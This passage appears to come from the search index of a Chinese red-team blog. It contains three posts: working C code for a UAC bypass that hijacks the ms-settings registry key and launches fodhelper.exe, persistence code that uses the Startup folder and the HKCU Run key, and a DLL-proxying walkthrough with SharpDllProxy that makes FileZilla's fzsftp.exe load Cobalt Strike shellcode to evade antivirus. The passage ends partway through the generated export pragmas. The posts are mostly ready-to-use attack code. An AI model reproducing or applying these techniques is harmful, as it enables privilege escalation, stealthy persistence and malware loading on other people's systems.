2.使用RegSetValueEx向创建的键值对里写入要执行的文件和DelegateExecute 3.CreateProcessA创建进程运行fodhelper.exe，以高权限运行向注册表中写入的文件 4.在一段时间后使用RegDeleteTreeA删除创建的键值对，恢复原状 代码 12345678910111213141516171819202122232425#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) { HKEY hKey; STARTUPINFOA StartupInfo = { 0 }; PROCESS_INFORMATION ProcessInformation = { 0 }; //创建注册表 RegCreateKeyA(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\ms-settings\\\\Shell\\\\open\\\\command&quot;, &amp;hKey); //写入要执行的文件 RegSetValueExA(hKey, &quot;&quot;, 0, REG_SZ, (BYTE*)&quot;cmd.exe&quot;, sizeof(&quot;cmd.exe&quot;)); //写入DelegateExecute RegSetValueExA(hKey, &quot;DelegateExecute&quot;, 0, REG_SZ, (BYTE*)&quot;&quot;, sizeof(&quot;&quot;)); //创建进程，运行fodhelper以高权限执行写入的文件 CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\\\Windows\\\\System32\\\\fodhelper.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;StartupInfo, &amp;ProcessInformation); Sleep(3000); //删除创建的ms-settings RegDeleteTreeA(hKey, &quot;Software\\\\Classes\\\\ms-settings&quot;);//删除 return 0;} 执行前 执行后 相关API函数RegCreateKeyA创建键值对 12345LSTATUS RegCreateKeyA( HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult); RegSetValueEx写入注册表键值 成功返回 ERROR_SUCCESS. 12345678LSTATUS RegSetValueExA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 LPCSTR lpValueName,//指定要被查询或写入的键值的名称 DWORD Reserved,//保留，始终为0 DWORD dwType,//写入键值的类型 const BYTE *lpData,//写入键值的缓冲区 DWORD cbData//写入键值缓冲区的长度 ); RegDeleteTreeA删除键值对 1234LSTATUS RegDeleteTreeA( HKEY hKey, LPCSTR lpSubKey); CreateProcessA创建进程 123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);","link":"/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/"},{"title":"通过添加启动目录和和修改注册表进行权限维持","text":"添加启动目录由于启动目录不固定，需要先通过SHGetSpecialFolderPath获取启动路径，再CopyFile把要自启动的程序复制过去 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;shlobj_core.h&gt;int main(){ wchar_t StartupFolder[MAX_PATH] = {0}; wchar_t Path[MAX_PATH] = { 0 }; BOOL bRet= SHGetSpecialFolderPath(NULL, StartupFolder, CSIDL_STARTUP, FALSE); if (!bRet) { return -1; } GetModuleFileName(NULL, (LPWSTR)&amp;Path, MAX_PATH); wcscat_s(StartupFolder, L&quot;\\\\Persistance.exe&quot;); MessageBox(NULL, StartupFolder, L&quot;StartupFolder&quot;, MB_OK); if (CopyFile(Path, StartupFolder, FALSE)) { MessageBox(NULL, L&quot;succeed&quot;, L&quot;succeed&quot;, MB_OK); } return 0;} 修改注册表无需管理员权限即可修改HKEY_CURRENT_USER 在HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run中写入程序路径即可实现开机自启动 代码12345678910111213141516171819202122232425262728293031//添加自身到注册表启动项BOOL Regpersist(){ HKEY hKey; LPCTSTR szRun = _T(&quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;); if (RegOpenKeyEx(HKEY_CURRENT_USER, szRun, 0, KEY_ALL_ACCESS, &amp;hKey) == ERROR_SUCCESS) { TCHAR szFileName[MAX_PATH] = { 0 }; DWORD dwRet = GetModuleFileName(NULL, szFileName, MAX_PATH); AfxMessageBox(szFileName); long lRet = RegSetValueEx(hKey, _T(&quot;Login&quot;), 0, REG_SZ, (BYTE*)szFileName, dwRet); RegCloseKey(hKey); if (lRet != ERROR_SUCCESS) return FALSE; //else // 删除启动; //{ // long lRet = RegDeleteValue(hKey, &quot;MFCLogin&quot;); // RegCloseKey(hKey); // if (lRet != ERROR_SUCCESS) // return FALSE; //} } else { MessageBox(_T(&quot;打开注册表失败&quot;)); return FALSE; } MessageBox(_T(&quot;添加成功&quot;)); return TRUE;} 相关API函数SHGetSpecialFolderPath该api用来获取指定的系统路径 123456BOOL SHGetSpecialFolderPathA( HWND hwnd, LPSTR pszPath, int csidl, //CSIDL_STARTUP BOOL fCreate); RegOpenKey打开注册表，成功返回ERROR_SUCCESS 12345LSTATUS RegOpenKeyA( HKEY hKey, //指定一个父键句柄 HKEY_CURRENT_USER LPCSTR lpSubKey,//指向一个字符串，表示要打开的子键名称,_T(&quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;) PHKEY phkResult//返回打开的子键句柄 &amp;hKey); RegCloseKey关闭注册表，成功返回ERROR_SUCCESS 123LSTATUS RegCloseKey( HKEY hKey//打开的子键句柄); RegQueryValueEx注册表键值的查询 成功返回 ERROR_SUCCESS. 12345678LSTATUS RegQueryValueExA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 LPCSTR lpValueName,//指定要被查询的键值的名称 LPDWORD lpReserved,//保留，始终NULL LPDWORD lpType,//返回被查询的值的类型 LPBYTE lpData,//返回被查询数据的缓冲区 LPDWORD lpcbData//缓冲区长度); RegSetValueEx注册表键值的写入 成功返回 ERROR_SUCCESS. 12345678LSTATUS RegSetValueExA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 HKEY_LOCAL LPCSTR lpValueName,//指定要被查询或写入的键值的名称 MFCLogin DWORD Reserved,//保留，始终为0 0 DWORD dwType,//写入键值的类型 REG_SZ const BYTE *lpData,//写入键值的缓冲区 路径 DWORD cbData//写入键值缓冲区的长度 sizeof); RegEnumValue注册表键值的枚举 成功返回 ERROR_SUCCESS. 12345678910LSTATUS RegEnumValueA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 DWORD dwIndex,//查询的索引值 LPSTR lpValueName,//健名的缓冲区 LPDWORD lpcchValueName,//健名缓冲区的长度 LPDWORD lpReserved,//保留，NULL LPDWORD lpType,//返回被查询的值的类型 LPBYTE lpData,//被查询键值的缓冲区 LPDWORD lpcbData//被查询键值的缓冲区的大小); RegDeleteValue注册表键值的删除 成功返回 ERROR_SUCCESS. 1234LSTATUS RegDeleteValueA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 LPCSTR lpValueName//指向欲删除的键值项的名称); GetModuleFileName在开发过程中经常需要获得程序当前的运行目录，这时就可以使用GetModuleFileName 12345DWORD WINAPI GetModuleFileName( HMODULE hModule,//要获取文件名的模块名柄,null表示当前模块 LPTSTR lpFileName,//输出参数，存放取得的文件名 TCHAR lpfilename DWORD nSize//参数的长度 MAX_PATH);","link":"/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"title":"DLL代理加载shellcode实践","text":"在程序开发过程中往往会使用第三方库，大多数第三方库会提供DLL(动态链接库)文件，因此程序需要相应的DLL文件才能启动，通过Dll代理将正常dll替换为欸一dll，可以进行免杀或权限维持 找出运行必须的dll文件依照DLL代理加载shellcod用于免杀，维权等等中的例子下载Filezilla，将fzsftp.exe放到单独文件夹运行，找到运行必须的libnettle-8.dll文件 编译SharpDllProxy下载SharpDllProxy后用Visual Stuio 2019打开SharpDllProxy.sln 编译生成SharpDllProxy.exe 生成代理Dll指定目标dll文件后生成libnettle-8_pragma.c和tmp2BF5.dll，payload.bin为cs生成的raw格式shellcode。 1sharpdllproxy.exe --dll E:\\dllproxy\\libnettle-8.dll --payload E:\\dllproxy\\payload.bin 在vs中新建动态链接库将生成的libnettle-8_pragma.c代码复制后编译生成可执行shellcode的同名dll文件用以顶替原有的libnettle-8.dll文件 成功执行shellcode需要4个文件,fzsftp.exe调用替换后的恶意libnettle-8.dll文件后从payload.bin中读取shellcode后执行，tmp2BF5.dll即原来正常的libnettle-8.dll文件，保证程序正常运行 执行后cs成功上线 原理分析用vs打开libnettle-8_pragma.c后查看代码，开头调用了400多个tmp2BF5.dll中的函数以保证文件的正常运行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546#include &quot;pch.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define _CRT_SECURE_NO_DEPRECATE#pragma warning (disable : 4996)#pragma comment(linker, &quot;/export:_nettle_aeads=tmp2BF5._nettle_aeads,@1&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt=tmp2BF5._nettle_aes_decrypt,@2&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_aesni=tmp2BF5._nettle_aes_decrypt_aesni,@3&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_x86_64=tmp2BF5._nettle_aes_decrypt_x86_64,@4&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt=tmp2BF5._nettle_aes_encrypt,@5&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_aesni=tmp2BF5._nettle_aes_encrypt_aesni,@6&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_table=tmp2BF5._nettle_aes_encrypt_table,@7&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_x86_64=tmp2BF5._nettle_aes_encrypt_x86_64,@8&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_invert=tmp2BF5._nettle_aes_invert,@9&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_set_key=tmp2BF5._nettle_aes_set_key,@10&quot;)#pragma comment(linker, &quot;/export:_nettle_armors=tmp2BF5._nettle_armors,@11&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_absorb=tmp2BF5._nettle_camellia_absorb,@12&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_crypt=tmp2BF5._nettle_camellia_crypt,@13&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_invert_key=tmp2BF5._nettle_camellia_invert_key,@14&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_table=tmp2BF5._nettle_camellia_table,@15&quot;)#pragma comment(linker, &quot;/export:_nettle_chacha_core=tmp2BF5._nettle_chacha_core,@16&quot;)#pragma comment(linker, &quot;/export:_nettle_ciphers=tmp2BF5._nettle_ciphers,@17&quot;)#pragma comment(linker, &quot;/export:_nettle_cpuid=tmp2BF5._nettle_cpuid,@18&quot;)#pragma comment(linker, &quot;/export:_nettle_ctr_crypt16=tmp2BF5._nettle_ctr_crypt16,@19&quot;)#pragma comment(linker, &quot;/export:_nettle_gcm_hash8=tmp2BF5._nettle_gcm_hash8,@20&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_encrypt_block=tmp2BF5._nettle_gost28147_encrypt_block,@21&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_CryptoPro_3411=tmp2BF5._nettle_gost28147_param_CryptoPro_3411,@22&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_test_3411=tmp2BF5._nettle_gost28147_param_test_3411,@23&quot;)#pragma comment(linker, &quot;/export:_nettle_hashes=tmp2BF5._nettle_hashes,@24&quot;)#pragma comment(linker, &quot;/export:_nettle_macs=tmp2BF5._nettle_macs,@25&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_sse2=tmp2BF5._nettle_memxor_sse2,@26&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_x86_64=tmp2BF5._nettle_memxor_x86_64,@27&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_block=tmp2BF5._nettle_poly1305_block,@28&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_digest=tmp2BF5._nettle_poly1305_digest,@29&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_set_key=tmp2BF5._nettle_poly1305_set_key,@30&quot;)#pragma comment(linker, &quot;/export:_nettle_ripemd160_compress=tmp2BF5._nettle_ripemd160_compress,@31&quot;)#pragma comment(linker, &quot;/export:_nettle_salsa20_core=tmp2BF5._nettle_salsa20_core,@32&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_sha_ni=tmp2BF5._nettle_sha1_compress_sha_ni,@33&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_x86_64=tmp2BF5._nettle_sha1_compress_x86_64,@34&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress=tmp2BF5._nettle_sha256_compress,@35&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_sha_ni=tmp2BF5._nettle_sha256_compress_sha_ni,@36&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_x86_64=tmp2BF5._nettle_sha256_compress_x86_64,@37&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_pad=tmp2BF5._nettle_sha3_pad,@38&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_update=tmp2BF5._nettle_sha3_update,@39&quot;)#pragma comment(linker, &quot;/export:_nettle_sha512_compress=tmp2BF5._nettle_sha512_compress,@40&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2=tmp2BF5._nettle_umac_l2,@41&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_final=tmp2BF5._nettle_umac_l2_final,@42&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_init=tmp2BF5._nettle_umac_l2_init,@43&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3=tmp2BF5._nettle_umac_l3,@44&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3_init=tmp2BF5._nettle_umac_l3_init,@45&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh=tmp2BF5._nettle_umac_nh,@46&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh_n=tmp2BF5._nettle_umac_nh_n,@47&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly128=tmp2BF5._nettle_umac_poly128,@48&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly64=tmp2BF5._nettle_umac_poly64,@49&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_set_key=tmp2BF5._nettle_umac_set_key,@50&quot;)#pragma comment(linker, &quot;/export:_nettle_write_be32=tmp2BF5._nettle_write_be32,@51&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le32=tmp2BF5._nettle_write_le32,@52&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le64=tmp2BF5._nettle_write_le64,@53&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Final=tmp2BF5.nettle_MD5Final,@54&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Init=tmp2BF5.nettle_MD5Init,@55&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Update=tmp2BF5.nettle_MD5Update,@56&quot;)#pragma comment(linker, &quot;/export:nettle_aes128=tmp2BF5.nettle_aes128,@57&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_decrypt=tmp2BF5.nettle_aes128_decrypt,@58&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_encrypt=tmp2BF5.nettle_aes128_encrypt,@59&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_invert_key=tmp2BF5.nettle_aes128_invert_key,@60&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_decrypt_key=tmp2BF5.nettle_aes128_set_decrypt_key,@61&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_encrypt_key=tmp2BF5.nettle_aes128_set_encrypt_key,@62&quot;)#pragma comment(linker, &quot;/export:nettle_aes192=tmp2BF5.nettle_aes192,@63&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_decrypt=tmp2BF5.nettle_aes192_decrypt,@64&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_encrypt=tmp2BF5.nettle_aes192_encrypt,@65&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_invert_key=tmp2BF5.nettle_aes192_invert_key,@66&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_decrypt_key=tmp2BF5.nettle_aes192_set_decrypt_key,@67&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_encrypt_key=tmp2BF5.nettle_aes192_set_encrypt_key,@68&quot;)#pragma comment(linker, &quot;/export:nettle_aes256=tmp2BF5.nettle_aes256,@69&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_decrypt=tmp2BF5.nettle_aes256_decrypt,@70&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_encrypt=tmp2BF5.nettle_aes256_encrypt,@71&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_invert_key=tmp2BF5.nettle_aes256_invert_key,@72&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_decrypt_key=tmp2BF5.nettle_aes256_set_decrypt_key,@73&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_encrypt_key=tmp2BF5.nettle_aes256_set_encrypt_key,@74&quot;)#pragma comment(linker, &quot;/export:nettle_aes_decrypt=tmp2BF5.nettle_aes_decrypt,@75&quot;)#pragma comment(linker, &quot;/export:nettle_aes_encrypt=tmp2BF5.nettle_aes_encrypt,@76&quot;)#pragma comment(linker, &quot;/export:nettle_aes_invert_key=tmp2BF5.nettle_aes_invert_key,@77&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_decrypt_key=tmp2BF5.nettle_aes_set_decrypt_key,@78&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_encrypt_key=tmp2BF5.nettle_aes_set_encrypt_key,@79&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour128_set_key=tmp2BF5.nettle_arcfour128_set_key,@80&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_crypt=tmp2BF5.nettle_arcfour_crypt,@81&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_set_key=tmp2BF5.nettle_arcfour_set_key,@82&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128=tmp2BF5.nettle_arctwo128,@83&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key=tmp2BF5.nettle_arctwo128_set_key,@84&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key_gutmann=tmp2BF5.nettle_arctwo128_set_key_gutmann,@85&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40=tmp2BF5.nettle_arctwo40,@86&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40_set_key=tmp2BF5.nettle_arctwo40_set_key,@87&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64=tmp2BF5.nettle_arctwo64,@88&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64_set_key=tmp2BF5.nettle_arctwo64_set_key,@89&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_decrypt=tmp2BF5.nettle_arctwo_decrypt,@90&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_encrypt=tmp2BF5.nettle_arctwo_encrypt,@91&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_gutmann128=tmp2BF5.nettle_arctwo_gutmann128,@92&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key=tmp2BF5.nettle_arctwo_set_key,@93&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_ekb=tmp2BF5.nettle_arctwo_set_key_ekb,@94&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_gutmann=tmp2BF5.nettle_arctwo_set_key_gutmann,@95&quot;)#pragma comment(linker, &quot;/export:nettle_base16=tmp2BF5.nettle_base16,@96&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_final=tmp2BF5.nettle_base16_decode_final,@97&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_init=tmp2BF5.nettle_base16_decode_init,@98&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_single=tmp2BF5.nettle_base16_decode_single,@99&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_update=tmp2BF5.nettle_base16_decode_update,@100&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_single=tmp2BF5.nettle_base16_encode_single,@101&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_update=tmp2BF5.nettle_base16_encode_update,@102&quot;)#pragma comment(linker, &quot;/export:nettle_base64=tmp2BF5.nettle_base64,@103&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_final=tmp2BF5.nettle_base64_decode_final,@104&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_init=tmp2BF5.nettle_base64_decode_init,@105&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_single=tmp2BF5.nettle_base64_decode_single,@106&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_update=tmp2BF5.nettle_base64_decode_update,@107&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_final=tmp2BF5.nettle_base64_encode_final,@108&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_group=tmp2BF5.nettle_base64_encode_group,@109&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_init=tmp2BF5.nettle_base64_encode_init,@110&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_raw=tmp2BF5.nettle_base64_encode_raw,@111&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_single=tmp2BF5.nettle_base64_encode_single,@112&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_update=tmp2BF5.nettle_base64_encode_update,@113&quot;)#pragma comment(linker, &quot;/export:nettle_base64url=tmp2BF5.nettle_base64url,@114&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_decode_init=tmp2BF5.nettle_base64url_decode_init,@115&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_encode_init=tmp2BF5.nettle_base64url_encode_init,@116&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish128_set_key=tmp2BF5.nettle_blowfish128_set_key,@117&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_decrypt=tmp2BF5.nettle_blowfish_decrypt,@118&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_encrypt=tmp2BF5.nettle_blowfish_encrypt,@119&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_set_key=tmp2BF5.nettle_blowfish_set_key,@120&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_clear=tmp2BF5.nettle_buffer_clear,@121&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_copy=tmp2BF5.nettle_buffer_copy,@122&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_grow=tmp2BF5.nettle_buffer_grow,@123&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init=tmp2BF5.nettle_buffer_init,@124&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_realloc=tmp2BF5.nettle_buffer_init_realloc,@125&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_size=tmp2BF5.nettle_buffer_init_size,@126&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_reset=tmp2BF5.nettle_buffer_reset,@127&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_space=tmp2BF5.nettle_buffer_space,@128&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_write=tmp2BF5.nettle_buffer_write,@129&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128=tmp2BF5.nettle_camellia128,@130&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_crypt=tmp2BF5.nettle_camellia128_crypt,@131&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_invert_key=tmp2BF5.nettle_camellia128_invert_key,@132&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_set_encrypt_key=tmp2BF5.nettle_camellia128_set_encrypt_key,@133&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192=tmp2BF5.nettle_camellia192,@134&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_decrypt_key=tmp2BF5.nettle_camellia192_set_decrypt_key,@135&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_encrypt_key=tmp2BF5.nettle_camellia192_set_encrypt_key,@136&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256=tmp2BF5.nettle_camellia256,@137&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_crypt=tmp2BF5.nettle_camellia256_crypt,@138&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_invert_key=tmp2BF5.nettle_camellia256_invert_key,@139&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_set_decrypt_key=tmp2BF5.nettle_camellia256_set_decrypt_key,@140&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_set_encrypt_key=tmp2BF5.nettle_camellia256_set_encrypt_key,@141&quot;)#pragma comment(linker, &quot;/export:nettle_camellia_set_decrypt_key=tmp2BF5.nettle_camellia_set_decrypt_key,@142&quot;)#pragma comment(linker, &quot;/export:nettle_cast128=tmp2BF5.nettle_cast128,@143&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_decrypt=tmp2BF5.nettle_cast128_decrypt,@144&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_encrypt=tmp2BF5.nettle_cast128_encrypt,@145&quot;)#pragma comment(linker, &quot;/export:nettle_cast128_set_key=tmp2BF5.nettle_cast128_set_key,@146&quot;)#pragma comment(linker, &quot;/export:nettle_cast5_set_key=tmp2BF5.nettle_cast5_set_key,@147&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_decrypt=tmp2BF5.nettle_cbc_decrypt,@148&quot;)#pragma comment(linker, &quot;/export:nettle_cbc_encrypt=tmp2BF5.nettle_cbc_encrypt,@149&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt=tmp2BF5.nettle_ccm_aes128_decrypt,@150&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_decrypt_message=tmp2BF5.nettle_ccm_aes128_decrypt_message,@151&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_digest=tmp2BF5.nettle_ccm_aes128_digest,@152&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt=tmp2BF5.nettle_ccm_aes128_encrypt,@153&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_encrypt_message=tmp2BF5.nettle_ccm_aes128_encrypt_message,@154&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_key=tmp2BF5.nettle_ccm_aes128_set_key,@155&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_set_nonce=tmp2BF5.nettle_ccm_aes128_set_nonce,@156&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes128_update=tmp2BF5.nettle_ccm_aes128_update,@157&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt=tmp2BF5.nettle_ccm_aes192_decrypt,@158&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_decrypt_message=tmp2BF5.nettle_ccm_aes192_decrypt_message,@159&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_digest=tmp2BF5.nettle_ccm_aes192_digest,@160&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt=tmp2BF5.nettle_ccm_aes192_encrypt,@161&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_encrypt_message=tmp2BF5.nettle_ccm_aes192_encrypt_message,@162&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_key=tmp2BF5.nettle_ccm_aes192_set_key,@163&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_set_nonce=tmp2BF5.nettle_ccm_aes192_set_nonce,@164&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes192_update=tmp2BF5.nettle_ccm_aes192_update,@165&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt=tmp2BF5.nettle_ccm_aes256_decrypt,@166&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_decrypt_message=tmp2BF5.nettle_ccm_aes256_decrypt_message,@167&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_digest=tmp2BF5.nettle_ccm_aes256_digest,@168&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt=tmp2BF5.nettle_ccm_aes256_encrypt,@169&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_encrypt_message=tmp2BF5.nettle_ccm_aes256_encrypt_message,@170&quot;)#pragma comment(linker, 